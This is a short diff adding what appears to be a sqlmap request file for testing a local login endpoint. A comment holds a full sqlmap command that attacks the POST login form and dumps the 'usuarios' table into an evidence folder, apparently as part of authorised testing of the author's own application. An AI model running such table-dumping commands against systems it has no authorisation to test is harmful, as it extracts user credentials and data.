@@ -1,0 +1,3 @@
+http://localhost:5001/login (POST)  # C:\Users\alebo\AppData\Local\Temp\opencode\venv_v1\Scripts\sqlmap -u http://localhost:5001/login --data=username=admin&password=x --batch --level=1 --risk=1 -T usuarios --dump --output-dir=docs/sqlmap_evidence/login
+
+username=admin&password=x
